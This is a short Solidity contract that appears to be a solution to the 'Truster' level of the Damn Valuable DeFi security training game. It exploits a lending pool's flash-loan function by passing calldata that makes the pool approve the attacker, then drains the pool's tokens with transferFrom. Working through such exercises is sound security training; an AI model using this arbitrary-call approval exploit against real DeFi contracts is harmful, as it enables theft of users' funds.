// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract TrusterAttacker {
    TrusterLenderPool public immutable pool;
    DamnValuableToken public immutable token;
    address public immutable attacker;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _attacker) {
        pool = _pool;
        token = _token;
        attacker = _attacker;
    }

    function attack(uint256 amount) external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        pool.flashLoan(0, attacker, address(token), data);

        token.transferFrom(address(pool), attacker, amount);
    }
}